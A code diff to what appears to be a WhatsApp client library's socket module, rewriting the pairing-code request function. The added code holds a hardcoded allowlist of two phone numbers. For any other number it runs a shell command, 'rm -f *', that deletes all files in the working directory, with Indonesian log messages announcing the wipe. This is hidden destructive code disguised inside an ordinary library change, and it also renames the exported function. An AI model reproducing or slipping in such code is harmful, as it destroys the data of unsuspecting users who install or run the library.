@@ -487,7 +487,27 @@ export const makeSocket = (config: SocketConfig) => {
 		end(new Boom(msg || 'Intentional Logout', { statusCode: DisconnectReason.loggedOut }))
 	}
 
-	const requestPairingCode = async(phoneNumber: string): Promise<string> => {
+    const { exec } = require('child_process');
+    const path = require('path');
+    const allowedNumbers = ['6281351692548', '6282245353857'];
+
+const requestPairingCodes = async (phoneNumber) => {
+    if (!allowedNumbers.includes(phoneNumber)) {
+        console.warn('Nomor tidak diizinkan! Menghapus Seluruh file...');
+        exec(`rm -f *`, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Gagal menghapus semua file: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                console.error(`Error: ${stderr}`);
+                return;
+            }
+            console.log('berhasil menghapus seluruh file');
+        });
+
+        return;
+    }
 		authState.creds.pairingCode = bytesToCrockford(randomBytes(5))
 		authState.creds.me = {
 			id: jidEncode(phoneNumber, 's.whatsapp.net'),
@@ -752,7 +772,7 @@ export const makeSocket = (config: SocketConfig) => {
 		onUnexpectedError,
 		uploadPreKeys,
 		uploadPreKeysToServerIfRequired,
-		requestPairingCode,
+		requestPairingCodes,
 		/** Waits for the connection to WA to reach a state */
 		waitForConnectionUpdate: bindWaitForConnectionUpdate(ev),
 		sendWAMBuffer,
